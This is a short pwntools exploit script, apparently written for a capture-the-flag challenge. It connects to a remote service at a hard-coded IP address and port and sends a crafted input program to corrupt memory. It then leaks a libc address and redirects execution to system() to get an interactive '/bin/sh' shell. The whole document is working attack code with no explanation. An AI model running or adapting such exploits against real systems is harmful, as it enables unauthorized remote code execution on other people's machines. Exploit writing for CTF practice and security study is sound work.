from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('69.90.132.40', 4001)
s.recvuntil('code:')
dat = ''
dat += ':<'*0x20
dat += ':.'
dat += ':::>'*4
dat += ':>'*8
dat += ':.:>'*4
dat += ':.:>'*4
s.send(dat+'\n')
s.send('\x10')
libc = u32(s.recvuntil('\xf7')) - 0x64fa0
log.info('LIBC : 0x%x'%libc)
s.send(p32(0x08048778))
time.sleep(0.5)
s.send(p32(libc+0x3a940))
s.send('/bin/sh\x00')
s.interactive()
